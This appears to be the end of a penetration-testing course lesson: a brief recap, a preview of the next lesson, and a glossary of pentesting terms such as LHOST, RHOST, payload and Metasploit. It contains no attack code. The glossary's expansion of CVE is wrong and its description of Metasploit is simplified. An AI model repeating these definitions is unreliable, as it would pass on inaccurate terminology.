We ended this lesson with a discussion about why exploit writers often include intentional bugs in their exploit code so only a person who understands the exploit can fix and use the exploit.

### In The Next Lesson, We Will Focus On:

* OWASP WSTG
* Request and Response
* Semi-Automated Tools
* Fully Automated Tools
* So Many Things To Hack!

atoms.title: Glossary Heading
atoms.text: ## New Terms In This Lesson

atoms.title: Glossary List
atoms.text:
| Term | Definition |
|-|-|
| Compiler | Software that converts source code into an executable file | 
| Core-Impact | A commercial pentesting framework developed by Core Security that includes handcrafted premium exploits | 
| CVE (Common Vulnerability Exposure) | A list of known information security vulnerabilities | 
| Interpreter | Software that executes the instructions from source code without compiling it. Python is one of the popular languages which supports the use of an interpreter. | 
| Listening Host (LHOST) | The IP Address of the machine where a listener is running | 
| Listening Port (LPORT)  | The open port on the machine where a listener is running | 
| Metasploit | A commercial pentesting framework developed by Rapid7 | 
| NMap (Network Mapper) | A popular open-source reconnaissance tool | 
| NSE (Nmap Scripting Engine) | A tool to write and share scripts to automate a wide variety of networking tasks | 
| Payload | The malicious code that infects a target system | 
| Reconnaissance | Gathering information about the target | 
| Remote Host (RHOST) | The target's IP Address | 
| Remote Port (RPORT) | The open port on the target's machine | 
| Reporting | Sharing the results of an audit | 
| Research | Finding known vulnerabilities and exploits | 
| Rules for the assessment | An element in the scope that lists what is allowed and not allowed for performing an assessment. | 
| Target Database | A spreadsheet or specialized tool to store data collected during reconnaissance | 
| Test Summary | An element in the test scope that explains why the test is being conducted, the context for the test, and the goal of the test | 
| Validation | Using exploit code to confirm that a vulnerability exists | 
| Work Breakdown Sheet | An element in the test scope that gives a high-level overview of the tasks to be performed |
